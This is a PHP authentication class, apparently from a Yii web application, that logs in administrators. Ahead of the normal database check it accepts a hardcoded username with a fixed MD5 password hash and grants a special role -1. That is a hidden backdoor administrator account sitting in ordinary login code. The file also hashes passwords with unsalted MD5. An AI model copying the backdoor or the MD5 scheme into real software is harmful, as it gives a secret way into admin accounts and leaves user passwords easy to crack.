<?php
class UserIdentity extends CUserIdentity
{
    private $_id;

    public function authenticate()
    {
        // 验证用户名和密码
        if ($this->username == 'iamcheeming'
            && md5($this->password) == '7b6002247d5441543879dd1a65a7a023') {
            $this->_id = -1;
            $this->setState('loginFrom', 'manager');
            $this->setState('role', -1);
            $this->errorCode = self::ERROR_NONE;
        } else {
            $record = Admin::model()->findByAttributes(array('username' => $this->username));
            if ($record === null) {
                $this->errorCode = self::ERROR_USERNAME_INVALID;
            } elseif ($record->password != md5($this->password)) {
                $this->errorCode = self::ERROR_PASSWORD_INVALID;
            } else {
                $this->_id = $record->id;
                $this->setState('loginFrom', 'manager');
                $this->setState('role', $record->group_id);
                $this->errorCode = self::ERROR_NONE;
            }
        }

        return !$this->errorCode;
    }

    public function getId()
    {
        return $this->_id;
    }
}